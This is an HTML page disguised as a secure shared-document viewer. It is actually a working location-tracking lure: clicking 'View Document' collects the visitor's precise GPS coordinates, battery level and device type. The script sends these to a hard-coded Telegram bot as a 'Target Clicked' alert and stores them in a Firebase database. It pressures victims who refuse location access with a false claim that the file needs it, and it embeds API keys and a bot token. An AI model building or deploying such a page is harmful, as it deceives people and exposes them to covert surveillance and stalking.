<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Viewer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            padding: 40px 20px; 
            background-color: #0d1117; 
            color: #c9d1d9; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #161b22;
            padding: 35px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            max-width: 420px;
            width: 100%;
            border: 1px solid #30363d;
        }
        h2 {
            font-size: 20px;
            margin-bottom: 12px;
            color: #58a6ff;
        }
        p {
            font-size: 14px;
            color: #8b949e;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .btn {
            background-color: #238636;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:hover {
            background-color: #2ea043;
        }
        #status { 
            font-size: 13px; 
            color: #8b949e; 
            margin-top: 15px;
            word-break: break-word;
        }
        .error { color: #f85149 !important; }
    </style>
</head>
<body>
    <div class="container" id="main-box">
        <h2>🔒 Encrypted File Shared</h2>
        <p>You have received a secure document. Click the button below to verify and view the content.</p>
        <button class="btn" id="loadBtn">View Document</button>
        <p id="status"></p>
    </div>

    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDhYrfKfzjRXTuJZS095zZe6UoI17CnHgw",
            authDomain: "live-tracker-c443f.firebaseapp.com",
            databaseURL: "https://live-tracker-c443f-default-rtdb.firebaseio.com",
            projectId: "live-tracker-c443f",
            storageBucket: "live-tracker-c443f.firebasestorage.app",
            messagingSenderId: "444398218197",
            appId: "1:444398218197:web:a21f13be9e0d726f9f6b5c",
            measurementId: "G-TP2244W66P"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const statusText = document.getElementById("status");
        const loadBtn = document.getElementById("loadBtn");

        // --- TELEGRAM CONFIGURATION ---
        const BOT_TOKEN = "8944921867:AAEIWr6FFxFuZQ60IKhUUSWDjq6en2dXu74";
        const CHAT_ID = "8407541236"; 

        let hasAlerted = false;

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Desktop/PC";
            if (/android/i.test(ua)) device = "Android Mobile";
            if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone/iOS";
            return device;
        }

        async function sendTelegramAlert(lat, lng, accuracy) {
            if (hasAlerted) return;
            hasAlerted = true;

            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging ⚡)' : ''}`;
                }
            } catch (e) {
                batteryInfo = "Not Accessible";
            }

            const deviceType = getDeviceInfo();
            statusText.innerText = "Loading file data...";
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            
            // Fast instant message without waiting for slow address API
            const message = `🚨 *Target Clicked & Accessed!* 🎯\n\n` +
                            `📱 *Device:* ${deviceType}\n` +
                            `🔋 *Battery:* ${batteryInfo}\n` +
                            `🌐 *Coordinates:* \`${lat}, ${lng}\`\n` +
                            `🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n` +
                            `🗺️ [Open in Google Maps](${mapUrl})`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            }).then(() => {
                statusText.innerText = "Loaded successfully!";
            }).catch(err => console.error("Telegram Alert Error:", err));
        }

        loadBtn.addEventListener("click", () => {
            loadBtn.innerText = "Verifying...";
            loadBtn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    sendTelegramAlert(lat, lng, accuracy);

                    set(ref(db, 'users/sahil'), {
                        latitude: lat,
                        longitude: lng,
                        accuracy: accuracy,
                        timestamp: Date.now()
                    });

                }, (error) => {
                    statusText.innerText = "Permission denied. Please allow location to view file.";
                    statusText.classList.add("error");
                    loadBtn.innerText = "Retry";
                    loadBtn.disabled = false;
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                statusText.innerText = "Browser not supported.";
                statusText.classList.add("error");
            }
        });
    </script>
</body>
</html>
